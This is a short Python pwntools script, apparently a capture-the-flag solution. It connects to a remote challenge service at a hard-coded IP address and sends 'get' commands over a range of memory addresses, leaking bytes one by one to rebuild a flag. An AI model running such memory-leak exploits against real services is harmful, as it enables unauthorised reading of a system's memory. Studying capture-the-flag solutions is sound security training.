#!/usr/bin/env python2

from pwn import *


r = remote('54.89.22.85', 10005)
sleep(2)
flag = []
r.recvuntil(r'>> ')

for i in range(args['from'] or 134514752, args['to'] or 134514752 + 0x64, 1):
	r.send('get {}\r\n'.format(i))
	data = r.recvuntil(r'[{}] = '.format(i))
	flag_char = r.recvline().strip()
	log.info("[{}] = {}".format(i, flag_char))
	flag.append(flag_char)
	
	if int(flag_char, 16) == 0:
		break


print(''.join([chr(int(c, 16)) for c in flag]))
